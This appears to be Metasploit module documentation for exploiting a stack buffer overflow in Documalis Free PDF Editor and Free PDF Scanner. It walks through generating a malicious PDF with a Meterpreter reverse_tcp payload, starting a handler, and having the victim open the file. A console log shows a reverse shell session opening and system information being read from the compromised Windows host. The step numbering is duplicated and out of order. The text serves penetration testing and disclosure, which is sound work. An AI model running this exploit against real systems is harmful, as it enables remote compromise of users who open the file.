
## Vulnerable Application

  This module exploits a stack-based buffer overflow in Documalis Free PDF Editor v.5.7.2.26  and Documalis Free PDF Scanner v.5.7.2.122. 

## Verification Steps

   1.  Install application on the target machine
   2.  Start msfconsole
   3.  Do: `use [exploit/windows/fileformat/documalis_pdf_editor_and_scanner.rb]`
   4.  Do: `show targets`
   5.  Do: `0 <Documalis Free PDF Editor v.5.7.2.26 / Win 7, Win 10>`
   6.  Do: `1 <Documalis Free PDF Scanner v.5.7.2.122 / Win 7, Win 10>`
   7.  Do: `set target 0 for Documalis Free PDF Editor and set target 1 for Documalis Free PDF Scanner`
   8.  Do: `set payload [windows/meterpreter/reverse_tcp]`
   9.  Do: `set LHOST [IP]`
   9.  Do: `run`
   10. Do: `use [exploit/multi/handler]`
   11. Do: `set payload [windows/meterpreter/reverse_tcp]`
   12. Do: `set LHOST [IP]`
   13. Do: `run`
   14. Copy the generated file to the target machine
   15. Open Documalis Free PDF Editor  
   17. Put PDF file drag and drop
   16. Or select load PDF file
   15. Open Documalis Free PDF Scanner 
   16. Select Add and load PDF file
   You should get a shell.

## Options

  **FILENAME**

  The filename that the shellcode gets written to. Setting a filename is not required, as there is a default name already set.

## Scenarios

### Tested on Win 10 x64 and Windows 7 x64 


  Run Exploit 

  ```
  msf5 > use exploit/windows/fileformat/documalis_pdf_editor_and_scanner
  msf5 exploit(windows/fileformat/documalis_pdf_editor_and_scanner) > show targets
  Exploit targets:

  Id  Name

  0   <Documalis Free PDF Editor v.5.7.2.26 / Win 7, Win 10>
  1   <Documalis Free PDF Scanner v.5.7.2.122 / Win 7, Win 10>

  msf5 exploit(windows/fileformat/documalis_pdf_editor_and_scanner) > set target 1
  target => 1
  msf5 exploit(windows/fileformat/documalis_pdf_editor_and_scanner) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf5 exploit(windows/fileformat/documalis_pdf_editor_and_scanner) > set lhost 192.168.199.136
  lhost => 192.168.199.136
  msf5 exploit(windows/fileformat/documalis_pdf_editor_and_scanner) > exploit
  [+] msf.pdf stored at C:/Users/exploit/.msf4/local/msf.pdf

  msf5 exploit(windows/fileformat/documalis_pdf_editor_and_scanner) > use exploit/multi/handler
  msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf5 exploit(multi/handler) > set lhost 192.168.199.136
  lhost => 192.168.199.136
  msf5 exploit(multi/handler) > run

  [*] Started reverse TCP handler on 192.168.199.136:4444
  [*] Sending stage (180291 bytes) to 192.168.199.1
  [*] Meterpreter session 1 opened (192.168.199.136:4444 -> 192.168.199.1:51316) at 2020-06-15 21:01:20 +020
  meterpreter > sysinfo
  Computer        : DAVID_PC
  OS              : Windows 10 (10.0 Build 18362).
  Architecture    : x64
  System Language : de_DE
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  meterpreter >
  ```